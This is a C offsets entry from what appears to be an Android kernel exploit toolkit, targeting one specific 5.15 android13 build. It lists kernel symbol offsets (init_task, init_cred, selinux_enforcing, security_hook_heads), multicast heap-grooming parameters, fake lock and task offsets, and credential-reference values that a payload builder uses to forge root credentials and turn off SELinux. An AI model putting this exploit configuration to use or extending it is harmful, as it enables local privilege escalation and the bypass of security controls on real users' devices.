/* 5.15.189-android13-8-00016-g51bba4309aac-ab14546557 */

OFFSETS_ENTRY(
    "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
    STRUCT_OFFSETS_5_15,
    .requires_shizuku = 1,
    .pselect_waiter_shift = -2,
    .mcast_waiter_off = 0x60,
    .mcast_buffer_size = 0x108,
    .mcast_task_offset = 0x30,
    .mcast_lock_offset = 0x38,
    .mcast_fake_lock_offset = 0x1200,
    .mcast_fake_task_offset = 0x3200,
    .mcast_lock_slots_offset = 0x80,
    .mcast_lock_slot_count = 12,
    .mcast_lock_slot_stride = 8,
    .kernelsnitch_collisions = 8,
    .off_init_task = 0x02c43400,
    .off_init_cred = 0x02bfd588,
    .off_empty_zero_page = 0x02d54000,
    .off_mcast_fake_bss = 0x02da20c0,
    .off_root_task_group = 0x02d58ac0,
    .off_selinux_enforcing = 0x02daad88,
    .off_selinux_blob_sizes = 0x02167ac8,
    .off_security_hook_heads = 0x02165640,
    .off_slide_nfulnl_logger = 0x02b01e28,
    .off_slide_boot_id = 0x02dc6819,
    .off_slide_loggers_0_1 = 0x02b01d58,
    /* Firmware-specific references embedded in its init_cred copy. The
     * common payload builder applies these only from profile data. */
    .cred_ref0_offset = 0x80,
    .cred_ref1_offset = 0x88,
    .cred_ref2_offset = 0x90,
    .cred_ref3_offset = 0x98,
    .cred_ref_count = 4,
    .cred_ref0_image = 0xffffffc00ab23a80ULL,
    .cred_ref1_image = 0xffffffc00acce110ULL,
    .cred_ref2_image = 0xffffffc00ab23ff0ULL,
    .cred_ref3_image = 0xffffffc00ab23b28ULL,
),

/* BTF reference (runtime uses target.h defaults): */
/* #define STRUCT_PAGE_SIZE 0x40 */
/* #define STRUCT_PAGE_COMPOUND_HEAD 0x8 */
/* #define STRUCT_PAGE_TYPE 0x30 */
/* #define STRUCT_MM_STRUCT 0x3E0 */
